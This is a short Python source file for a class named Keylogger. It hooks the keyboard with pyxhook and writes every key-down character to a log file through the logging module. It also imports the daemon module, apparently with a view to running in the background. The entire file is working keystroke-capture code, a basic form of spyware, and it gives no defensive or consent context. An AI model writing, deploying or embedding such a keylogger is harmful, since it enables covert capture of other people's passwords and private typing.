import daemon
import logging
import pyxhook


class Keylogger:
    """ 
    Logs key events to a file
    """

    def __init__(self, filename: str):
        """
        Constructor
        
        :param filename: The name for the keylog file
        """
        
        self.filename = filename


    def log(self):
        """ 
        Start logging key presses
        """
        
        # 
        hook_manager = pyxhook.HookManager()
        
        # Assign callback for handling key strokes.
        hook_manager.KeyDown = self._keydown_callback
        
        # Hook the keyboard and start logging.
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key: pyxhook.pyxhook.PyxHookKeyEvent):
        """ 
        The handler for keyboard events
        
        :param key: The key down event
        """
        
        logging.debug(chr(key.Ascii))


    def setup(self):
        """
        Sets up the logging config
        """
        logging.basicConfig(
            level=logging.DEBUG,
            filename=self.filename,
            format='Key: %(message)s',
        )
    

